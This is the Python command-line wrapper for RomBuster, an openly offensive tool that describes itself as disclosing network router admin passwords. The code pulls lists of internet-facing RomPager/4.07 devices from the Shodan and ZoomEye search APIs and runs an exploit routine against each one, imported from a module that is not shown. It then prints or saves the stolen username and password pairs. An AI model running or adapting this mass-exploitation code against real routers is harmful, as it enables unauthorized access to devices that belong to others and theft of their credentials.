"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import argparse
import requests
import threading

from badges import Badges
from shodan import Shodan

from time import sleep as thread_delay

from .__main__ import RomBuster


class RomBusterCLI(RomBuster, Badges):
    """ Subclass of rombuster module.

    This subclass of rombuster module is intended for providing
    command-line interface for RomBuster.
    """

    thread_delay = 2

    description = (
        'RomBuster is a router exploitation tool that allows'
        ' to disclosure network router admin password.'
    )

    parser = argparse.ArgumentParser(description=description)
    parser.add_argument('-o', '--output', dest='output', help='Output result to file.')
    parser.add_argument('-i', '--input', dest='input', help='Input file of addresses.')
    parser.add_argument('-a', '--address', dest='address', help='Single address.')
    parser.add_argument('--shodan', dest='shodan', help='Shodan API key for exploiting devices over Internet.')
    parser.add_argument('--zoomeye', dest='zoomeye', help='ZoomEye API key for exploiting devices over Internet.')
    parser.add_argument('-p', '--pages', dest='pages', type=int, help='Number of pages you want to get from ZoomEye.')
    args = parser.parse_args()

    def thread(self, address: str) -> bool:
        """ Start new thread for the specified address.

        :param str address: device address
        :return bool: True if thread succeed
        """

        result = self.exploit(address)

        if result:
            result = f"({address}) - {result[0]}:{result[1]}"
            if not self.args.output:
                self.print_success(result)
            else:
                with open(self.args.output, 'a') as f:
                    f.write(f"{result}\n")
            return True
        return False

    def crack(self, addresses: list) -> None:
        """ Crack all devices from the specified list.

        :param list addresses: list of devices addresses
        :return None: None
        """

        line = "/-\\|"

        counter = 0
        for address in addresses:
            if counter >= len(line):
                counter = 0

            self.print_process(f"Exploiting... ({address}) {line[counter]}", end='')
            self.thread(address)

            counter += 1

    def start(self) -> None:
        """ Main command-line arguments handler.

        :return None: None
        """

        if self.args.output:
            directory = os.path.split(self.args.output)[0]

            if directory:
                if not os.path.isdir(directory):
                    self.print_error(f"Directory: {directory}: does not exist!")
                    return

        if self.args.zoomeye:
            self.print_process("Authorizing ZoomEye by given API key...")
            try:
                zoomeye = 'https://api.zoomeye.org/host/search?query=RomPager/4.07&page='
                zoomeye_header = {
                    'Authorization': f'JWT {self.zoomeye}'
                }
                addresses = list()

                if self.args.pages:
                    pages = int(self.args.pages)
                else:
                    pages = 100
                pages, page = divmod(pages, 20)
                if page != 0:
                    pages += 1

                for page in range(1, pages + 1):
                    results = requests.get(zoomeye + str(page), headers=zoomeye_header).json()
                    if not len(results['matches']):
                        self.print_error("Failed to authorize ZoomEye!")
                        return
                    for address in results['matches']:
                        addresses.append(address['ip'] + ':' + str(address['portinfo']['port']))
            except Exception:
                self.print_error("Failed to authorize ZoomEye!")
                return
            self.crack(addresses)

        elif self.args.shodan:
            self.print_process("Authorizing Shodan by given API key...")
            try:
                shodan = Shodan(self.args.shodan)
                results = shodan.search(query='RomPager/4.07')
                addresses = list()
                for result in results['matches']:
                    addresses.append(result['ip_str'] + ':' + str(result['port']))
            except Exception:
                self.print_error("Failed to authorize Shodan!")
                return
            self.print_success("Authorization successfully completed!")
            self.crack(addresses)

        elif self.args.input:
            if not os.path.exists(self.args.input):
                self.print_error(f"Input file: {self.args.input}: does not exist!")
                return

            with open(self.args.input, 'r') as f:
                addresses = f.read().strip().split('\n')
                self.crack(addresses)

        elif self.args.address:
            self.print_process(f"Exploiting {self.args.address}...")
            if not self.thread(self.args.address):
                self.print_error(f"({self.args.address}) - is not vulnerable!")

        else:
            self.parser.print_help()
            return
        self.print_empty(end='')


def main() -> None:
    """ RomBuster command-line interface.

    :return None: None
    """

    try:
        cli = RomBusterCLI()
        cli.start()
    except BaseException:
        pass
